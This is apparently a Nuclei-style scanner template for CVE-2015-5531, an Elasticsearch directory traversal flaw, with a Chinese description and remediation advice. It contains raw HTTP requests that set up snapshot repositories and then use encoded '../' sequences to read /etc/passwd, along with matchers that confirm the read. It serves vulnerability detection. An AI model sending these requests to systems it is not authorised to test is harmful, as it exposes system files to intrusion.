id: CVE-2015-5531
info:
  name: ElasticSearch directory traversal vulnerability (CVE-2015-5531)
  author:
  - l0ne1y
  description: |-
    Elasticsearch <1.6.1 目录遍历与文件读取漏洞
    Elasticsearch是荷兰Elasticsearch公司的一套基于Lucene构建的开源分布式RESTful搜索引擎，它主要用于云计算中，并支持通过HTTP使用JSON进行数据索引。

    Elasticsearch 1.0.0版本至1.6.0版本中存在目录遍历漏洞，该漏洞源于程序未能充分过滤用户提交的输入。远程攻击者可借助目录遍历字符‘..’利用该漏洞访问包含敏感信息的任意文件。
  severity: medium
  remediation: |
    官方修复方案：
    目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
    https://discuss.elastic.co/t/elasticsearch-directory-traversal-vulnerability-cve-2015-5531/25737

    临时修复方案：<br/>1、过滤\".\"，使用户在url中不能回溯上级目录。<br/>2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - ElasticsearchParseException
    - Failed to derive xcontent from
    - 114, 111, 111, 116, 58
  - type: status
    status:
    - 400
  matchers-condition: and
  raw:
  - |
    PUT /_snapshot/test HTTP/1.1
    Host: {{Hostname}}

    {
        "type": "fs",
        "settings": {
            "location": "/usr/share/elasticsearch/repo/test"
        }
    }
  - |
    PUT /_snapshot/test2 HTTP/1.1
    Host: {{Hostname}}

    {
        "type": "fs",
        "settings": {
            "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"
        }
    }
  - |
    GET /_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd  HTTP/1.1
    Host: {{Hostname}}
